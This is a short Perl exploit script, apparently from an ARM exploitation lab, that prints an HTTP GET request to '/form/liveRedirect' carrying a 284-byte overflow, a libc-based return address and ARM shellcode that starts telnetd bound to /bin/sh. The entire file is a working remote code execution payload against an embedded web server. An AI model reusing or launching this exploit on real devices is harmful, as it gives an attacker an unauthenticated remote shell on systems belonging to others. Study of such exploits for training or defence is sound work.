#!/usr/bin/perl

$| = 1;		# turn off output buffering

$libc = 0x40021000;

$shellcode = "\x01\x10\x8f\xe2\x11\xff\x2f\xe1\x0b\x27\x24\x1b\x06\xa1\x08\xa2\x90\x1c\x04\xa3\xcc\x71\x54\x72\x1c\x80\x9c\x70\x16\xb4\x69\x46\x92\x1a\x18\x47\xff\xff\x0f\xeftelnetdX-l/bin/shX";

$buf = "A" x 284;
$buf .= pack("V", $libc + 0x00044684);

$request = "GET /form/liveRedirect?lang=${buf} HTTP/1.0\nHost: B${shellcode}\nUser-Agent: ARM/exploitlab\n\n";

print $request;
